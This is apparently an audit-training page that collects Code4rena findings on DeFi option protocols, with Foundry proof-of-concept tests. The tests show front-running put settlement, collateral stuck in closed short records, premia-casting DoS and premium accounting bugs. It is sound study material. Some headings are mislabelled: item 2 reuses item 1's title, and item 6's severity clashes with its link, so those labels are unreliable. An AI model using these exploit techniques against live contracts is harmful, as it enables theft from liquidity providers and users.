# ETAAcademy-Adudit: 6. Option

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>06. Option</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>option</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[High] Put settlement can be anticipated and lead to user losses and bonding DoS

### Put settlement

- Summary: Liquidity providers in PerpetualAtlanticVaultLP can anticipate potential losses from in-the-money put options, allowing them to withdraw liquidity before losses occur. This creates a disadvantage for slower or less technically savvy users. The issue is rooted in the predictability of settlement price thresholds and the LPs' ability to redeem collateral at any time, potentially draining available collateral and hindering market participation for other users.

- Impact & Recommendation: The severity is high because new depositors face guaranteed losses without a clear solution. Possible fixes include implementing a "cooling off period" for withdrawals or minting more shares to reward long-term holders, but both options impact the project's token economics.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-02-put-settlement-can-be-anticipated-and-lead-to-user-losses-and-bonding-dos) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.19;
    import { Test } from "forge-std/Test.sol";
    import "forge-std/console.sol";
    import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
    import { Setup } from "./Setup.t.sol";
    import { PerpetualAtlanticVault } from "contracts/perp-vault/PerpetualAtlanticVault.sol";
    contract PoC is ERC721Holder, Setup {
    // ================================ HELPERS ================================ //
    function mintWeth(uint256 _amount, address _to) public {
        weth.mint(_to, _amount);
    }
    function mintRdpx(uint256 _amount, address _to) public {
        rdpx.mint(_to, _amount);
    }
    function deposit(uint256 _amount, address _from) public {
        vm.startPrank(_from, _from);
        vaultLp.deposit(_amount, _from);
        vm.stopPrank();
    }
    function purchase(uint256 _amount, address _as) public returns (uint256 id) {
        vm.startPrank(_as, _as);
        (, id) = vault.purchase(_amount, _as);
        vm.stopPrank();
    }
    function setApprovals(address _as) public {
        vm.startPrank(_as, _as);
        rdpx.approve(address(vault), type(uint256).max);
        rdpx.approve(address(vaultLp), type(uint256).max);
        weth.approve(address(vault), type(uint256).max);
        weth.approve(address(vaultLp), type(uint256).max);
        vm.stopPrank();
    }
    // ================================ CORE ================================ //
    /**
    Assumptions & config:
        - address(this) is impersonating the rdpxV2Core contract
        - premium per option: 0.05 weth
        - epoch duration: 1 day; 86400 seconds
        - initial price of rdpx: 0.2 weth
        - pricing precision is in 0.1 gwei
        - premium precision is in 0.1 gwei
        - rdpx and weth denomination in wei
    **/
    function testPoCHigh3() external {
        // Setup starts here ----------------------------->
        setApprovals(address(1));
        setApprovals(address(2));
        setApprovals(address(3));
        mintWeth(5 ether, address(1));
        mintWeth(5 ether, address(2));
        mintWeth(25 ether, address(3));
        /// The users deposit
        deposit(5 ether, address(1));
        deposit(5 ether, address(2));
        deposit(25 ether, address(3));
        uint256 userBalance = vaultLp.balanceOf(address(1));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(2));
        assertEq(userBalance, 5 ether);
        userBalance = vaultLp.balanceOf(address(3));
        assertEq(userBalance, 25 ether);
        // premium = 100 * 0.05 weth = 5 weth
        uint256 tokenId = purchase(100 ether, address(this)); // 0.015 gwei * 100 ether / 0.1 gwei = 15 ether collateral activated
        skip(86500); // expires epoch 1
        vault.updateFunding();
        vault.updateFundingPaymentPointer();
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 0.015 gwei;
        uint256 fundingAccrued = vault.calculateFunding(strikes);
        assertEq(fundingAccrued, 5 ether);
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        /// ---------------- POC STARTS HERE ---------------------------------------------------///
        // At this point the Core contract has purchased options to sell 100 rdpx tokens
        // The market moves against `rdpx` and the puts are now in the money
        priceOracle.updateRdpxPrice(0.010 gwei);
        // Bob, a savvy user, sees there is collateral available to withdraw, and
        // because he monitors the price he knows the vault is about to take a loss
        // thus, he withdraws his capital, expecting a call to settle.
        userBalance = vaultLp.balanceOf(address(1));
        vm.startPrank(address(1));
        vaultLp.redeem(userBalance, address(1), address(1));
        vm.stopPrank();
        vm.startPrank(address(this), address(this));
        (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);
        vm.stopPrank();
        // Bob now re-enters the LP Vault
        vm.startPrank(address(1));
        vaultLp.deposit(weth.balanceOf(address(1)), address(1));
        vm.stopPrank();
        // Now we tally up the scores
        console.log("User Bob ends with (WETH, RDPX, Shares):");
        userBalance = vaultLp.balanceOf(address(1));
        (uint256 aBob, uint256 bBob) = vaultLp.redeemPreview(userBalance);
        console.log(aBob, bBob, userBalance);
        userBalance = vaultLp.balanceOf(address(2));
        (uint256 aDave, uint256 bDave) = vaultLp.redeemPreview(userBalance);
        console.log("User Dave ends with (WETH, RDPX, Shares):");
        console.log(aDave, bDave, userBalance);
        /**
            Bob and Dave both started with 5 ether deposited into the vault LP.
            Bob ends up with shares worth 4.08 WETH + 16.32 RDPX
            Dave ends up with shares worth 3.48 WETH + 13.94 RDPX
            Thus we can conclude that by anticipating calls to `settle`,
            either by monitoring the market or through front-running,
            Bob has forced Dave to take on more of the losses.
        */
    }
    }

  ```

  </details>

## 2.[High] Put settlement can be anticipated and lead to user losses and bonding DoS

### Set minimum timeToExpiry

- Summary: The problem occurs in the PerpetualAtlanticVault contract when attempting to purchase options. If the time difference between the next funding payment and the current block time is less than 864 seconds, it causes the option pricing to use a time to expiry of 0, resulting in a revert. This leads to unexpected reverts approximately every 14 minutes during each funding epoch.

- Impact & Recommendation: Set minimum  timeToExpiry  inside  calculatePremium.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-06-bond-operations-will-always-revert-at-certain-time-when-putoptionsrequired-is-true) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
      function testOptionPricingRevert() public {
        OptionPricingSimple optionPricingSimple;
        optionPricingSimple = new OptionPricingSimple(100, 5e6);
        (uint256 rdpxRequired, uint256 wethRequired) = rdpxV2Core
            .calculateBondCost(1 * 1e18, 0);
        uint256 currentPrice = vault.getUnderlyingPrice(); // price of underlying wrt collateralToken
        uint256 strike = vault.roundUp(currentPrice - (currentPrice / 4)); // 25% below the current price
        // around 14 minutes before next funding payment
        vm.warp(block.timestamp + 7 days - 863 seconds);
        uint256 timeToExpiry = vault.nextFundingPaymentTimestamp() -
            block.timestamp;
        console.log("What is the current price");
        console.log(currentPrice);
        console.log("What is the strike");
        console.log(strike);
        console.log("What is time to expiry");
        console.log(timeToExpiry);
        uint256 price = vault.getUnderlyingPrice();
        // will revert
        vm.expectRevert();
        optionPricingSimple.getOptionPrice(strike, price, 100, timeToExpiry);
    }

  ```

  </details>

## 3.[High] Closing a SR during a wrong redemption proposal leads to loss of funds

### Collateral added to closed SR by disputed Redemption

- Summary: A vulnerability in the DittoETH protocol can lead to a loss of funds when closing a Short Record (SR) during a wrong redemption proposal. When a user creates a redemption proposal with the proposeRedemption function, they must provide a list of SRs with the lowest collateral ratios (CR) in ascending order. If the list is incorrect, anyone can dispute it using the disputeRedemption function. However, if an SR is closed (due to liquidation, exiting, or transfer) between proposing and disputing, its collateral is added to the closed SR and cannot be recovered.

- Impact & Recommendation: Reopening closed SRs could resolve the issue but might be misused to avoid liquidations.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-dittoeth#h-06-closing-a-sr-during-a-wrong-redemption-proposal-leads-to-loss-of-funds) & [Report](https://code4rena.com/reports/2024-03-dittoeth)

<details><summary>POC</summary>

```solidity
function test_dispute_on_non_existing_sr() public {
    // setup shorts
    makeShorts({singleShorter: true});
    _setETH(1000 ether);
    skip(1 hours);
    STypes.ShortRecord memory sr1 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID);
    STypes.ShortRecord memory sr2 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+1);
    STypes.ShortRecord memory sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
    uint256 cr1 = diamond.getCollateralRatio(asset, sr1);
    uint256 cr2 = diamond.getCollateralRatio(asset, sr2);
    uint256 cr3 = diamond.getCollateralRatio(asset, sr3);
    // CRs are increasing
    assertGt(cr2, cr1);
    assertGt(cr3, cr2);
    // user creates a wrong proposal
    MTypes.ProposalInput[] memory proposalInputs =
        makeProposalInputsForDispute({shortId1: C.SHORT_STARTING_ID + 1, shortId2: C.SHORT_STARTING_ID + 2});
    address redeemer = receiver;
    vm.prank(redeemer);
    diamond.proposeRedemption(asset, proposalInputs, DEFAULT_AMOUNT * 3 / 2, MAX_REDEMPTION_FEE);
    // on of the SRs in the proposal is closed
    fundLimitAskOpt(DEFAULT_PRICE, DEFAULT_AMOUNT / 2, extra);
    exitShort(C.SHORT_STARTING_ID + 2, DEFAULT_AMOUNT / 2, DEFAULT_PRICE, sender);
    // SR is now closed
    sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
    assertEq(uint(sr3.status), uint(SR.Closed));
    uint88 collateralBefore = sr3.collateral;
    // another user disputes the wrong proposal
    address disputer = extra;
    vm.prank(disputer);
    diamond.disputeRedemption({
        asset: asset,
        redeemer: redeemer,
        incorrectIndex: 0,
        disputeShorter: sender,
        disputeShortId: C.SHORT_STARTING_ID
    });
    // SR is still closed and collateral increased
    sr3 = diamond.getShortRecord(asset, sender, C.SHORT_STARTING_ID+2);
    assertEq(uint(sr3.status), uint(SR.Closed));
    assertGt(sr3.collateral, collateralBefore);
}

```

</details>

## 4.[Medium] Premia calculation can cause DOS

### Premia calculation

- Summary: Premia calculation can cause a Denial of Service (DoS) for certain addresses. If removedLiquidity is high and netLiquidity is extremely low, the calculation in `_getPremiaDeltas` will revert since the amount cannot be cast to uint128.

- Impact & Recommendation: Modify the premia calculation to handle these edge cases and use uint256 for storing premia to avoid casting issues.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#m-01-premia-calculation-can-cause-dos) & [Report](https://code4rena.com/reports/2023-11-panoptic)

<details><summary>POC</summary>

```solidity
diff --git a/test/foundry/core/SemiFungiblePositionManager.t.sol b/test/foundry/core/SemiFungiblePositionManager.t.sol
index 5f09101..e9eef27 100644
--- a/test/foundry/core/SemiFungiblePositionManager.t.sol
+++ b/test/foundry/core/SemiFungiblePositionManager.t.sol
@@ -5,7 +5,7 @@ import "forge-std/Test.sol";
 import {stdMath} from "forge-std/StdMath.sol";
 import {Errors} from "@libraries/Errors.sol";
 import {Math} from "@libraries/Math.sol";
-import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {PanopticMath,LiquidityChunk} from "@libraries/PanopticMath.sol";
 import {CallbackLib} from "@libraries/CallbackLib.sol";
 import {TokenId} from "@types/TokenId.sol";
 import {LeftRight} from "@types/LeftRight.sol";
@@ -55,7 +55,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
     using LeftRight for uint256;
     using LeftRight for uint128;
     using LeftRight for int256;
-
+    using LiquidityChunk for uint256;
     /*//////////////////////////////////////////////////////////////
                            MAINNET CONTRACTS
     //////////////////////////////////////////////////////////////*/
@@ -79,6 +79,7 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         IUniswapV3Pool(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
     IUniswapV3Pool constant USDC_WETH_30 =
         IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
+    IUniswapV3Pool constant PEPE_WETH_30 = IUniswapV3Pool(0x11950d141EcB863F01007AdD7D1A342041227b58);
     IUniswapV3Pool[3] public pools = [USDC_WETH_5, USDC_WETH_5, USDC_WETH_30];

     /*//////////////////////////////////////////////////////////////
@@ -189,7 +190,8 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
     /// @notice Set up world state with data from a random pool off the list and fund+approve actors
     function _initWorld(uint256 seed) internal {
         // Pick a pool from the seed and cache initial state
-        _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
+        // _cacheWorldState(pools[bound(seed, 0, pools.length - 1)]);
+        _cacheWorldState(PEPE_WETH_30);

         // Fund some of the the generic actor accounts
         vm.startPrank(Bob);
@@ -241,6 +243,93 @@ contract SemiFungiblePositionManagerTest is PositionUtils {
         sfpm = new SemiFungiblePositionManagerHarness(V3FACTORY);
     }

+    function testHash_PremiaRevertDueToLowNetHighLiquidity() public {
+        _initWorld(0);
+        vm.stopPrank();
+        sfpm.initializeAMMPool(token0, token1, fee);
+
+        deal(token0, address(this), type(uint128).max);
+        deal(token1, address(this), type(uint128).max);
+
+        IERC20Partial(token0).approve(address(sfpm), type(uint256).max);
+        IERC20Partial(token1).approve(address(sfpm), type(uint256).max);
+
+        int24 strike = ((currentTick / tickSpacing) * tickSpacing) + 3 * tickSpacing;
+        int24 width = 2;
+        int24 lowTick = strike - tickSpacing;
+        int24 highTick = strike + tickSpacing;
+
+        uint256 shortTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 0, 0, 0, strike, width);
+
+        uint128 posSize = 100_000_000e18; // gives > 2**71 liquidity ~$100
+
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+
+        uint256 accountLiq = sfpm.getAccountLiquidity(address(PEPE_WETH_30), address(this), 0, lowTick, highTick);
+
+        assert(accountLiq.rightSlot() > 2 ** 71);
+
+        // the added liquidity is removed leaving some dust behind
+        uint256 longTokenId = uint256(0).addUniv3pool(poolId).addLeg(0, 1, 0, 1, 0, 0, strike, width);
+        sfpm.mintTokenizedPosition(longTokenId, posSize / 2, type(int24).min, type(int24).max);
+        sfpm.mintTokenizedPosition(longTokenId, posSize / 2 , type(int24).min, type(int24).max);
+
+        // fees is accrued on the position
+        vm.startPrank(Swapper);
+        uint256 amountReceived = router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token1, token0, fee, Bob, block.timestamp, 100e18, 0, 0)
+        );
+        (, int24 tickAfterSwap,,,,,) = pool.slot0();
+        assert(tickAfterSwap > lowTick);
+
+
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(token0, token1, fee, Bob, block.timestamp, amountReceived, 0, 0)
+        );
+        vm.stopPrank();
+
+        // further mints will revert due to amountToCollect being non-zero and premia calculation reverting
+        vm.expectRevert(Errors.CastingError.selector);
+        sfpm.mintTokenizedPosition(shortTokenId, posSize, type(int24).min, type(int24).max);
+    }
+
+    function testHash_DustLiquidityAmount() public {
+        int24 tickLower = 199260;
+        int24 tickUpper = 199290;
+
+        /*
+            amount0 219738690
+            liquidity initial 3110442974185905
+            liquidity withdraw 3110442974185904
+        */
+
+        uint amount0 = 219738690;
+
+        uint128 liquidityMinted = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                amount0
+            );
+
+        // remove liquidity in pieces
+        uint halfAmount = amount0/2;
+        uint remaining = amount0-halfAmount;
+
+        uint128 liquidityRemoval1 = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                halfAmount
+            );
+        uint128 liquidityRemoval2 = Math.getLiquidityForAmount0(
+                uint256(0).addTickLower(tickLower).addTickUpper(tickUpper),
+                remaining
+            );
+
+        assert(liquidityMinted - (liquidityRemoval1 + liquidityRemoval2) > 0);
+    }
+
+    function onERC1155Received(address, address, uint256 id, uint256, bytes memory) public returns (bytes4) {
+        return this.onERC1155Received.selector;
+    }
+

```

</details>

## 5.[High] SettleLongPremium is incorrectly implemented: premium should be deducted instead of added

### premium deducted

- Summary: The `settleLongPremium` function, which is intended to settle premiums for long option holders, incorrectly adds the premium to the option owner’s account instead of deducting it. This misimplementation leads to the user receiving premium payments when they should be paying them.

- Impact & recommendation: Modify the `realizedPremia` calculation to be negative before calling `s_collateralToken.exercise()`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-panoptic#h-01-settlelongpremium-is-incorrectly-implemented-premium-should-be-deducted-instead-of-added) & [Report](https://code4rena.com/reports/2024-04-panoptic)

<details><summary>POC</summary>

```solidity

        assetsBefore0 = ct0.convertToAssets(ct0.balanceOf(Buyers[0]));
        assetsBefore1 = ct1.convertToAssets(ct1.balanceOf(Buyers[0]));
        // collect buyer 1's three relevant chunks
        for (uint256 i = 0; i < 3; ++i) {
            pp.settleLongPremium(collateralIdLists[i], Buyers[0], 0);
        }
        assertEq(
            ct0.convertToAssets(ct0.balanceOf(Buyers[0])) - assetsBefore0,
            33_342,
            "Incorrect Buyer 1 1st Collect 0"
        );

```

</details>

## 6.[High] Incorrect validation during checking liquidity spread

### Not paying premium

- Summary: Incorrect validation during the liquidity spread check in the Panoptic protocol allows option buyers to avoid paying the premium.

- Impact & Recommendation: Correct the validation in the liquidity spread check to revert when `NetLiquidity` is zero and `TotalLiquidity` is positive.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-panoptic#m-04-incorrect-validation-during-checking-liquidity-spread) & [Report](https://code4rena.com/reports/2024-04-panoptic)

<details><summary>POC</summary>

```solidity

+   if(netLiquidity == 0 && totalLiquidity > 0) revert;
    if(netLiquidity == 0) return;

```

</details>

## 7.[Medium] `_updateSettlementPostBurn()` may not correctly reduce s_grossPremiumLast[chunkKey]

### Update premium

- Summary: The function \_updateSettlementPostBurn() does not correctly update s_grossPremiumLast[chunkKey] when legPremia == 0, leading to incorrect accounting of the premium values.

- Impact & Recommendation: Regardless of the value of legPremia, it should recalculate s_grossPremiumLast[chunkKey] when long == 0.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-panoptic#m-06-_updatesettlementpostburn-may-not-correctly-reduce-s_grosspremiumlastchunkkey) & [Report](https://code4rena.com/reports/2024-04-panoptic)

<details><summary>POC</summary>

```solidity
    function _updateSettlementPostBurn(
        address owner,
        TokenId tokenId,
        LeftRightUnsigned[4] memory collectedByLeg,
        uint128 positionSize,
        bool commitLongSettled
    ) internal returns (LeftRightSigned realizedPremia, LeftRightSigned[4] memory premiaByLeg) {
...
        for (uint256 leg = 0; leg < numLegs; ) {
            LeftRightSigned legPremia = premiaByLeg[leg];
            bytes32 chunkKey = keccak256(
                abi.encodePacked(tokenId.strike(leg), tokenId.width(leg), tokenId.tokenType(leg))
            );
            // collected from Uniswap
            LeftRightUnsigned settledTokens = s_settledTokens[chunkKey].add(collectedByLeg[leg]);
            if (LeftRightSigned.unwrap(legPremia) != 0) {
                // (will be) paid by long legs
                if (tokenId.isLong(leg) == 1) {
...
                } else {
....
                    // subtract settled tokens sent to seller
                    settledTokens = settledTokens.sub(availablePremium);
                    // add available premium to amount that should be settled
                    realizedPremia = realizedPremia.add(
                        LeftRightSigned.wrap(int256(LeftRightUnsigned.unwrap(availablePremium)))
                    );
-                   unchecked {
-                       uint256[2][4] memory _premiumAccumulatorsByLeg = premiumAccumulatorsByLeg;-
-                        uint256 _leg = leg;
-
-                        // if there's still liquidity, compute the new grossPremiumLast
-                        // otherwise, we just reset grossPremiumLast to the current grossPremium
-                        s_grossPremiumLast[chunkKey] = totalLiquidity != 0
-                            ? LeftRightUnsigned
-                                .wrap(0)
-                                .toRightSlot(
-                                    uint128(
-                                        uint256(
-                                            Math.max(
-                                                (int256(
-                                                    grossPremiumLast.rightSlot() *
-                                                        totalLiquidityBefore
-                                                ) -
-                                                    int256(
-                                                        _premiumAccumulatorsByLeg[_leg][0] *
-                                                            positionLiquidity
-                                                    )) + int256(legPremia.rightSlot() * 2 ** 64),
-                                                0
-                                            )
-                                        ) / totalLiquidity
-                                    )
-                                )
-                                .toLeftSlot(
-                                    uint128(
-                                        uint256(
-                                            Math.max(
-                                                (int256(
-                                                    grossPremiumLast.leftSlot() *
-                                                        totalLiquidityBefore
-                                                ) -
-                                                    int256(
-                                                        _premiumAccumulatorsByLeg[_leg][1] *
-                                                            positionLiquidity
-                                                    )) + int256(legPremia.leftSlot()) * 2 ** 64,
-                                                0
-                                            )
-                                        ) / totalLiquidity
-                                    )
-                                )
-                            : LeftRightUnsigned
-                                .wrap(0)
-                                .toRightSlot(uint128(premiumAccumulatorsByLeg[_leg][0]))
-                                .toLeftSlot(uint128(premiumAccumulatorsByLeg[_leg][1]));
-                       }
                   }
               }
+             if (tokenId.isLong(leg) == 0){
+                   uint256 positionLiquidity = PanopticMath
+                   .getLiquidityChunk(tokenId, leg, positionSize)
+                    .liquidity();
+
+                    // new totalLiquidity (total sold) = removedLiquidity + netLiquidity (T - R)
+                    uint256 totalLiquidity = _getTotalLiquidity(tokenId, leg);
+                    // T (totalLiquidity is (T - R) after burning)
+                   uint256 totalLiquidityBefore = totalLiquidity + positionLiquidity;
+
+                    LeftRightUnsigned grossPremiumLast = s_grossPremiumLast[chunkKey];
+                    unchecked {
+                        uint256[2][4] memory _premiumAccumulatorsByLeg = premiumAccumulatorsByLeg;
+                        uint256 _leg = leg;
+
+                        // if there's still liquidity, compute the new grossPremiumLast
+                        // otherwise, we just reset grossPremiumLast to the current grossPremium
+                        s_grossPremiumLast[chunkKey] = totalLiquidity != 0
+                            ? LeftRightUnsigned
+                                .wrap(0)
+                                .toRightSlot(
+                                    uint128(
+                                        uint256(
+                                            Math.max(
+                                                (int256(
+                                                    grossPremiumLast.rightSlot() *
+                                                        totalLiquidityBefore
+                                                ) -
+                                                    int256(
+                                                        _premiumAccumulatorsByLeg[_leg][0] *
+                                                            positionLiquidity
+                                                    )) + int256(legPremia.rightSlot() * 2 ** 64),
+                                                0
+                                            )
+                                        ) / totalLiquidity
+                                    )
+                                )
+                                .toLeftSlot(
+                                    uint128(
+                                       uint256(
+                                            Math.max(
+                                                (int256(
+                                                    grossPremiumLast.leftSlot() *
+                                                        totalLiquidityBefore
+                                                ) -
+                                                    int256(
+                                                        _premiumAccumulatorsByLeg[_leg][1] *
+                                                            positionLiquidity
+                                                    )) + int256(legPremia.leftSlot()) * 2 ** 64,
+                                                0
+                                            )
+                                        ) / totalLiquidity
+                                    )
+                                )
+                            : LeftRightUnsigned
+                                .wrap(0)
+                                .toRightSlot(uint128(premiumAccumulatorsByLeg[_leg][0]))
+                                .toLeftSlot(uint128(premiumAccumulatorsByLeg[_leg][1]));
+                    }
+                }
            }
            // update settled tokens in storage with all local deltas
            s_settledTokens[chunkKey] = settledTokens;
            unchecked {
                ++leg;
            }
        }
    }
}

```

</details>
